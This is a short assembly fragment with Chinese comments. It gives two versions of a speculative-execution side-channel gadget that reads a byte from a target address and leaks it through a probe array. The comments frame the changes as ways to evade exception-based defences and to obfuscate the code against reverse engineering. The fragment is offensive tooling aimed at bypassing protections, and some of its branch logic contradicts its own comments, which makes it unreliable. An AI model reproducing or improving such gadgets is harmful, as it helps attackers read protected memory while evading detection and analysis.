; 增强隐蔽性（减少异常触发）
; 目标：降低被防御机制检测到的概率，通过避免直接访问非法地址触发异常
; 修改点：移除显式的非法内存访问，改用分支预测错误触发乱序执行

OutOfOrderExecution PROC
    ; 假设 rcx 为目标地址，rdx 为 probe_array 基址，r8 为分支条件（可被攻击者控制）
    test   r8, r8          ; 伪造条件分支（实际 r8 总为 0）
    jz     dummy_label     ; 分支预测会预测跳转，但实际不跳转
    ; 以下指令在乱序执行中执行
    movzx  rax, byte ptr [rcx]  ; 读取目标地址
    shl    rax, 12              ; 计算偏移
    mov    al, byte ptr [rdx+rax] ; 访问 probe_array
dummy_label:
    ret
OutOfOrderExecution ENDP
; 利用分支预测错误而非显式异常触发乱序执行，绕过基于异常监控的防御。

; 防御逆向工程（代码混淆）
; 目标：增加反汇编工具的分析难度,修改点：插入无用指令或加密代码段。
OutOfOrderExecution PROC
    db      0EBh, 02h          ; 短跳转（混淆反汇编）
    mov     r8, qword ptr [r8]
    xor     rax, rax
    jz      valid_label        ; 利用条件跳转掩盖真实逻辑
    ; 垃圾指令
    add     rsp, 8
    sub     rsp, 8
valid_label:
    movzx   rax, byte ptr [rcx]
    shl     rax, 12
    mov     al, byte ptr [rdx+rax]
    ret
OutOfOrderExecution ENDP
; 通过插入无效指令和跳转干扰逆向分析。